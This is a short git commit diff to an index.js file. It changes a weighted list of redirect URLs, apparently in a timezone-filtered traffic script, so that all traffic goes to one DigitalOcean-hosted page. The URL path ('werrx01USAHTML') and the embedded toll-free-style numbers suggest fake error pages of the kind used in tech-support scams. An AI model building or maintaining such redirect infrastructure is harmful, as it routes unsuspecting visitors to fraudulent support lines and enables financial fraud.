219043355a2a3643f39ae0c49f53cb5720dac579
paalakash <palaksh452@gmail.com>
2026-07-02 07:04:20 +0530

    Update index.js

--- index.js
+++ index.js
@@ -34,8 +34,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://dolphin-app-uf3z8.ondigitalocean.app/werrx01USAHTML/?bcda=1800-849-046", weight: 0.5 },
-    { url: "https://clownfish-app-qkxbd.ondigitalocean.app/werrx01USAHTML/?bcda=1800-403-676", weight: 0.5 }
+    { url: "https://clownfish-app-qkxbd.ondigitalocean.app/werrx01USAHTML/?bcda=1800-403-676", weight: 1.0 }
 
 ];
 
